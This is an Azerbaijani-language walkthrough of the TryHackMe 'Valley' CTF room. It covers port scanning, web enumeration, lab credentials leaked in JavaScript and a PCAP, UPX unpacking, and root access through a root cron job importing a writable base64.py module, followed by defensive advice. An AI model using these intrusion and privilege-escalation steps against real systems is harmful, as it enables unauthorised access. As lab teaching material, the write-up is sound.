# TryHackMe — Valley (`valleype`)

## Otaq haqqında

**Valley** TryHackMe-də Linux sistemində tam enumeration, veb tətbiqinin araşdırılması, FTP trafikinin Wireshark ilə analizi, binary unpacking, hash analizi və Python library hijacking mövzularını birləşdirən CTF otağıdır.

> Bu writeup yalnız TryHackMe laboratoriyası üçün nəzərdə tutulub. İcazəsiz sistemlərdə tətbiq etmək olmaz.

## Öyrənilən mövzular

- Full TCP port scan
- Web directory enumeration
- HTML/JavaScript source code analizi
- Gizli endpoint və faylların tapılması
- Standart olmayan FTP portunun aşkarlanması
- PCAP fayllarının Wireshark ilə analizi
- SSH ilə ilkin giriş
- UPX ilə packed binary açılması
- MD5 hash-lərin tanınması və yoxlanması
- Horizontal privilege escalation
- Cron job analizi
- Python library hijacking / writable module abuse

## 1. Maşını başladın

TryHackMe maşınını başladın və IP-ni qeyd edin:

```bash
export TARGET=10.10.x.x
```

İstəyə görə `/etc/hosts` faylına əlavə edin:

```text
TARGET_IP valley.thm
```

## 2. Nmap enumeration

Əvvəl bütün TCP portlarını yoxlayın:

```bash
nmap -p- -T4 -oN nmap-all.txt $TARGET
```

Tapılan portlar üçün servis və versiya scan-i aparın:

```bash
nmap -sC -sV -p 22,80,37370 -oN nmap-services.txt $TARGET
```

Əsas nəticə:

| Port | Xidmət | Əhəmiyyət |
|---|---|---|
| 22/tcp | SSH | Sonrakı giriş üçün istifadə oluna bilər |
| 80/tcp | HTTP | Veb enumeration üçün əsas səthdir |
| 37370/tcp | FTP | Standart olmayan FTP portudur |

Vacib dərs: yalnız default 1000 portu yoxlamaq kifayət etmir. `37370` kimi standart olmayan portlar full scan olmadan gözdən qaça bilər.

## 3. Veb tətbiqini araşdırın

Brauzerdə açın:

```text
http://TARGET_IP
```

Səhifədəki gallery və pricing bölmələrini yoxlayın. HTML source koduna baxın:

```text
Ctrl + U
```

Directory enumeration:

```bash
gobuster dir \
  -u http://$TARGET \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html,js
```

Gallery şəkillərinin `/static/` altında yerləşdiyini gördükdən sonra həmin qovluq ayrıca yoxlanır:

```bash
ffuf -u http://$TARGET/static/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -fs 0
```

Nəticələr arasında `/static/00` xüsusi diqqət tələb edir.

## 4. Gizli login səhifəsi

`/static/00` səhifəsinə baxdıqda əlavə gizli endpoint haqqında məlumat görünür. Writeup-larda bu endpoint aşağıdakı formada göstərilir:

```text
/dev1243224123123
```

Bu səhifə login forması açır.

Login formuna dərhal brute-force tətbiq etmək əvəzinə əvvəl source və JavaScript fayllarını analiz edin:

```bash
curl -s http://$TARGET/dev1243224123123 | tee login.html
grep -Eo 'src="[^"]+"' login.html
```

Səhifədə `dev.js` kimi JavaScript faylı varsa, onu endirib oxuyun:

```bash
curl -s http://$TARGET/dev1243224123123/dev.js
```

Bu faylda login məlumatları və əlavə qeyd faylının adı görünür. Writeup-larda istifadə olunan credential belə göstərilir:

```text
Username: siemDev
Password: california
```

Həmçinin `devNotes37370.txt` adlı fayl qeyd olunur:

```bash
curl -s http://$TARGET/dev1243224123123/devNotes37370.txt
```

Qeyd faylı FTP xidmətinin `37370` portunda işlədiyini təsdiqləyir.

## 5. FTP-yə giriş

FTP portu standart `21` deyil, `37370`-dir:

```bash
ftp $TARGET 37370
```

Credential-ləri daxil edin:

```text
Username: siemDev
Password: california
```

FTP daxilində faylları yoxlayın:

```text
ls
```

PCAP fayllarını lokal maşına endirin:

```text
binary
get <fayl-adı>
bye
```

və ya FTP client-dən sonra faylları `ls -l` ilə yoxlayın.

## 6. Wireshark ilə PCAP analizi

PCAP fayllarını Wireshark ilə açın:

```bash
wireshark *.pcapng
```

Əsas məqsəd HTTP üzərindən keçən POST sorğularını tapmaqdır. Wireshark filter sahəsinə yazın:

```text
http.request.method == POST
```

Sonra uyğun paketin üzərinə sağ klik edin:

```text
Follow → TCP Stream
```

Burada login sorğusunda başqa bir credential görünür. Writeup-larda bu credential `valleyDev` istifadəçisi üçün SSH girişində istifadə olunur.

SSH ilə yoxlayın:

```bash
ssh valleyDev@$TARGET
```

Girişdən sonra:

```bash
whoami
id
pwd
ls -la
```

User flag-i istifadəçinin home qovluğunda axtarın:

```bash
find /home -name user.txt 2>/dev/null
cat /home/*/user.txt
```

## 7. `valleyAuthenticator` binary-si

`valleyDev` istifadəçisinin qovluğunda `valleyAuthenticator` adlı binary tapılır:

```bash
find / -name valleyAuthenticator 2>/dev/null
file /path/to/valleyAuthenticator
ls -l /path/to/valleyAuthenticator
```

Binary-ni lokal maşına analiz üçün köçürmək olar. Məsələn, Kali-də müvəqqəti HTTP server başladın:

```bash
python3 -m http.server 8000
```

Hədəfdə isə faylı endirin:

```bash
wget http://ATTACKER_IP:8000/valleyAuthenticator
```

Əvvəl strings ilə yoxlayın:

```bash
strings valleyAuthenticator | less
```

Əgər binary daxilində `UPX` izləri görünürsə, UPX ilə açmağa çalışın:

```bash
upx -d valleyAuthenticator
```

Sonra yenidən analiz edin:

```bash
strings valleyAuthenticator | grep -Ei 'user|pass|md5|hash|valley'
```

Binary-dən iki MD5 hash tapılır. Hash-ləri tanımaq üçün:

```bash
hashid '<HASH>'
```

Yalnız bu labda əldə etdiyiniz hash-lər üzərində offline analiz aparın. Hash-lərdən `valley` istifadəçisinə aid credential əldə edilir.

## 8. `valley` istifadəçisinə keçid

Əldə etdiyiniz credential ilə SSH girişini yoxlayın:

```bash
ssh valley@$TARGET
```

İstifadəçinin qruplarını yoxlayın:

```bash
whoami
id
groups
```

Xüsusilə `valleyAdmin` qrupu vacibdir.

## 9. Cron job-u tapmaq

Cron konfiqurasiyalarını yoxlayın:

```bash
cat /etc/crontab
find /etc/cron* -type f -maxdepth 3 -print 2>/dev/null
```

Otaqda `photosEncrypt.py` adlı Python scriptinin root tərəfindən periodik icra edildiyi görülür. Scripti oxuyun:

```bash
cat /path/to/photosEncrypt.py
```

Script `base64` Python modulundan istifadə edir. Növbəti addım həmin modulun permission-larını yoxlamaqdır:

```bash
python3 -c 'import base64; print(base64.__file__)'
ls -l $(python3 -c 'import base64; print(base64.__file__)')
```

Əgər `valleyAdmin` qrupu bu fayla yazma icazəsinə malikdirsə, bu **Python library hijacking** zəifliyidir.

## 10. Python library hijacking məntiqi

Python scripti root kimi işləyir:

```text
root cron job → photosEncrypt.py → base64 modulu
```

Əgər `base64.py` dəyişdirilə bilirsə:

```text
valley istifadəçisi → base64.py-ni dəyişir → cron root kimi modulu import edir
```

Beləliklə, dəyişdirilmiş modulun kodu root kontekstində icra oluna bilər.

Lab üçün təhlükəsiz yoxlama məqsədilə əvvəlcə modulun işlədiyini təsdiqləyən sadə marker istifadə edin:

```python
open('/tmp/valley_test', 'w').write('module loaded')
```

Cron işlədikdən sonra yoxlayın:

```bash
ls -l /tmp/valley_test
```

Room-un son mərhələsində bu yazma icazəsindən istifadə edərək root shell əldə edilir. Listener və reverse shell yalnız TryHackMe lab IP-si və öz AttackBox/Kali IP-niz arasında istifadə edilməlidir.

Root shell əldə etdikdən sonra yoxlayın:

```bash
whoami
id
cat /root/root.txt
```

## İstifadə olunan zəifliklər

| Mərhələ | Problem |
|---|---|
| Veb | Gizli endpoint və source code-da açıq credential |
| FTP | Standart olmayan port və credential reuse |
| PCAP | Şifrələnməmiş HTTP trafikində credential sızması |
| Binary | Packed executable daxilində hash-lər |
| User keçidi | Binary-dən əldə edilən credential-lərin reuse edilməsi |
| Root | Root cron job-un writable Python modulundan istifadə etməsi |

## Müdafiə tədbirləri

- Credential-ləri JavaScript və source code-a yazmayın.
- Eyni parolu müxtəlif xidmətlərdə təkrar istifadə etməyin.
- FTP əvəzinə SFTP/SSH istifadə edin.
- Həssas trafik üçün HTTPS tətbiq edin.
- PCAP və log fayllarında açıq credential saxlamayın.
- Binary daxilində parol və hash saxlamayın.
- Root tərəfindən işlədilən Python modullarını adi istifadəçilər üçün writable etməyin.
- Cron script-ləri və dependency-lər üçün düzgün owner və permission təyin edin.
- `sudo`, qruplar və fayl icazələrini periodik audit edin.

## Qısa hücum zənciri

```text
Nmap
  ↓
HTTP enumeration
  ↓
dev.js-dən FTP credential
  ↓
37370 FTP
  ↓
PCAP analizi
  ↓
SSH valleyDev
  ↓
valleyAuthenticator binary
  ↓
valley credential
  ↓
Root cron + writable base64.py
  ↓
Root flag
```

## Mənbələr

- [TryHackMe — Valley](https://tryhackme.com/room/valleype)
- [Valley CTF Full Walkthrough — Medium](https://medium.com/@lidorrocah123/valley-ctf-full-walkthrough-tryhackme-3c865c915bb9)
- [TryHackMe Valley Writeup — Hashnode](https://christophbehr.hashnode.dev/tryhackme-valley-writeup)
- [Valley — CyberiumX](https://cyberiumx.com/write-ups/tryhackme-valley/)
- [Valley — Anthony Saab CTF Notes](https://ctfs.anthonyjsaab.com/tryhackme/valley)

